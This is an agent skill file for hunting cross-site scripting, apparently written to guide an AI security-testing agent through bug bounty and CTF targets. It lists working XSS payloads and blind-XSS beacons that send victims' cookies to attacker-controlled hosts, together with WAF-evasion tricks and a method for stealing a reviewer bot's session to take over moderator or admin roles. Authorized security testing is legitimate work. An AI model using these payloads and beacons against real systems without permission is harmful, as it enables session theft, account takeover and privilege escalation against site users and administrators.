---
name: hunt-xss
description: XSS hunting - reflected, stored, DOM-based. Marker discipline to avoid false positives. Blind-XSS beacons for stored contexts. SVG/markdown/redirect vectors. Wiki-first, FIND schema output. Use when reflected/stored input or a DOM sink appears.
---

## Sections
- [[#Wiki]]
- [[#Confirmation gate]]
- [[#Attack Surface Signals]]
- [[#Methodology]]
- [[#Key Payloads]]
- [[#Validation]]
- [[#False Positives]]
- [[#Cross-routing]]
- [[#Severity]]

state: active
created: 2026-10-12
last_used: 2026-10-12

# Hunt: XSS

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration
limits, stop conditions, wiki protocol, FIND output, and Deadends. Marker discipline (unique 8+
char canaries, check the baseline first) lives in hunt-core.

## Wiki

Hub: [[web-moc]] · Primary page: [[techniques/web/xss]] · Payload arsenal: `wiki/payloads/xss.md`
Anchors: [[dangling-markup]], [[xssi]], [[browser-extension-attacks]], [[prototype-pollution]]
**REFS:** [[techniques/web/xss]], wiki/payloads/xss.md

qmd_query "XSS cross-site scripting DOM CSP bypass sanitizer" via wiki-search MCP — ONLY when you have a concrete hint the map above
doesn't cover (a specific sink/version/CVE, an observed escape); not a blanket first step.

## Confirmation gate
NOT confirmation: payload URL-encoded or HTML-encoded in response, `<script>` appears as `&lt;script&gt;`, ASP.NET validator blocked `<`.
IS confirmation: HTTP/DNS request to your unique Collaborator subdomain with browser User-Agent (Mozilla/Chrome).

When you plant a blind/stored XSS beacon, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | xss | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique Burp Collaborator / interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind XSS without a HIT row.

## Attack Surface Signals

**APPROACH:** Map every reflection point, classify reflected/stored/DOM, probe the sanitizer (`aaa"bbb'ccc<ddd`), then fire the context-matched payload; plant a blind beacon in admin/moderation-viewed fields and confirm the session-theft callback.
**AVOID:** A payload that comes back URL/HTML-encoded (`&lt;script&gt;`) is NOT XSS; a blind/stored beacon is unproven until its `oob.md` row flips to HIT.

High-value: admin panels (`*/admin`, `*/settings`), payment flows, stored wikis/labels/tags, SSO/signin pages, SVG upload endpoints.

**Approval / moderation workflow = the classic stored-XSS-to-privilege-escalation sink. Recognize it.**
When your submission "awaits review/approval by a moderator/admin" AND any field you control is rendered
back in a privileged panel (a pending-registrations queue, a report/ticket viewer, a comment-moderation
list, an order-approval screen), there is almost always a headless **reviewer bot** that opens that panel.
That is a blind-XSS delivery you get for free: plant a cookie/session beacon in the field and the reviewer's
session is exfiltrated -> replay their cookie -> you ARE the moderator/admin. The tell is often visible while
authed as a lower role or as admin: if the panel shows a prior submission's raw markup (an unescaped username
like `<x>` or `sqltest'...` sitting literally in the table), the sink is confirmed *without even firing a
payload* -- that raw reflection IS the stored-XSS proof, do not walk past it. This is frequently the INTENDED
path to the mid-tier (moderator) flag/role on a box that also has a heavier unintended route (LFI/RCE).

**Reviewer-bot + WAF stored-XSS gotchas (avoid the self-inflicted grind):**
- **If a public writeup / known payload exists, fire its EXACT form first** before inventing variants.
- **Obfuscate ONLY the blocked token, not the whole payload.** Submit each suspect token in
  isolation to learn exactly what the WAF rejects (often just the literal word `cookie`, or
  `onerror`/`<script>`). Keep everything else literal: `new Image().src='//IP/?x='+document['coo'+'kie']`
  (split only `cookie`, keep `document`) beats splitting `document` too. Over-obfuscation
  (`srcdoc`+`atob`+`.concat`+template-literals) usually breaks EXECUTION, not the WAF.
- **Prefer the simplest vector that passes the WAF AND runs in the bot.** A plain
  `<body onload="new Image().src=...">` beacon is more reliable than a `javascript:` iframe (modern
  headless Chrome blocks `javascript:`-iframe navigation) or `srcdoc` gymnastics.
- **Do NOT flood the moderation queue with test payloads.** The reviewer panel usually renders a
  LIMITED window; buried test messages never surface, so "no callback" becomes ambiguous (broken
  payload vs not-rendered). Submit ONE payload + a paired plain-`<img>` control in the SAME message
  (same render), so a callback disambiguates render-vs-execution. Iterate in a clean queue.
- **Read the bot's contract before iterating payloads.** The detector often scores ONE signal (a
  cookie marker) while localStorage poison runs unscored; the bot may render only the victim's FIRST
  item, so give the victim account exactly one item; and a shared single-instance bot can WEDGE
  (instant generic failures, no navigation): its negative is not a verdict, stop burning probes and
  re-test solo after it recovers. [[techniques/web/xss]]
- Payload arsenal + WAF-token isolation examples: `wiki/payloads/xss.md`.

DOM XSS signals in JS:
```javascript
document.write(  innerHTML =  location.hash  location.search
eval(  $.html(  $(location  document.referrer
```

## Methodology
1. Map all reflection points - URL params, form fields, HTTP headers, file upload names. In an SPA,
   grep the JS bundle for `dangerouslySetInnerHTML`/`v-html` first (that names the raw-HTML sinks),
   then submit the same markup to EVERY write field and diff the readbacks: raw storage AND a raw-HTML
   sink is the stored-XSS field; escaped sibling fields are the control. [[techniques/web/xss]]
2. Classify: Reflected / Stored / DOM. Input in a `#fragment` that never appears in the
   Network tab is DOM (client-side only); markup absent from View-Source but present in the
   live Inspector was written by JS after page load. Re-fires after refresh = stored.
   Browser-run discipline for the DOM leg: console capture before first navigation;
   networkidle before DOM inspection; console snapshot beside the screenshot into `poc/`
   (console artifacts are client data: they live only under `targets/<eng>/poc/`).
3. Probe sanitizer: send `aaa"bbb'ccc<ddd` - observe which chars escaped
4. Test allowlisted tag combos: `<math><style>`, `<svg><style>`, `<iframe srcdoc>`
5. Hunt SVG upload vectors - often bypasses CSP
6. Test markdown/RDoc: `[text](javascript:alert(1))`, `link:javascript:`
7. Check redirect params: `?redirect=javascript:alert(1)`
8. Test UTM params: `utm_source`, `utm_medium` - often unsanitized on marketing pages
9. Plant blind-XSS beacons in admin-viewable fields (error messages, User-Agent, Referer, username,
   contact/support forms): load a remote script whose PATH names the field so one submission
   reveals which field fired; skip fields validated on both ends or never rendered in cleartext
   (passwords get hashed). [[techniques/web/xss]]
10. Validate in real browser before reporting; prefer `alert(window.origin)` over `alert(1)`
    so the popup names the executing origin when input renders in a cross-domain iframe
11. **Distill when confirmed** (per hunt-core): reusable sanitizer or CSP bypass, GENERIC, `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/xss.md`.

## Key Payloads
```html
<!-- Context probe -->
aaa"bbb'ccc<ddd>eee`fff

<!-- Reflected baseline -->
"><script>alert(document.domain)</script>
<svg onload=alert(1)>

<!-- SVG (CSP bypass) -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- Sanitizer bypass -->
<math><style><img src=x onerror=alert(1)></style></math>

<!-- Blind-XSS beacon (into a reviewer/approval field) -->
<svg onload=fetch('//bxss-<tag>.<collab>/x?c='+document.cookie)>

<!-- Filter-bypass beacon: word "cookie" blocked / <script>,<img> filtered / entity-encoded.
     Concatenate the property name + use iframe onload; exfil via new Image() (no fetch needed). -->
<iframe onload="new Image().src='//<lhost>:<port>/?x='+document['coo'+'kie']">
<!-- other separators when on\w+= is regex-filtered: <svg%0conload=...> (form feed), <svg/onload=...> -->

<!-- Markdown -->
[Click](javascript:alert(document.domain))
```

## Validation

- Proof = execution in a real browser (`alert(window.origin)` names the executing
  origin), or a blind beacon whose `oob.md` row flipped to HIT. DOM claims need the sink
  observed in the live Inspector (post-load), not view-source.
- Counterevidence to seek: the deployed CSP (enforced vs report-only), and the sink's
  context on OTHER origins that embed the content.

## False Positives

- Encoded reflection (`&lt;script&gt;` in the body): the encoder IS the control;
  name it (which encoder, at which response point) when deadending.
- Self-XSS with no chain (no second victim).
- Markdown rendered through an escaping renderer: probe `aaa"bbb'ccc<ddd` FIRST.
- Reflection in a JSON response with a JSON Content-Type never rendered.
- CSP report-only misread as enforced, or enforced misread as report-only (read the
  header directive).

## Cross-routing

- Load hunt-upload for SVG/file-borne payload delivery.
- Load hunt-cache / hunt-smuggling when the payload needs a poisoned or desynced
  response to reach the victim.
- Load hunt-llm when the sink renders model output (markdown render of LLM content).
- Not this skill: stored-but-always-escaped fields (deadend with the control named).

## Severity

Confirm in a real browser, not just Burp. FIND output and Deadends format per hunt-core:

- **high** - stored in an admin/privileged context, or session theft demonstrated.
- **medium** - reflected requiring a click.
- **low** - self-XSS with no chain.

Class deadend line: `- [ ] XSS on <host> <param> -- payload encoded/rejected, [detail]`.
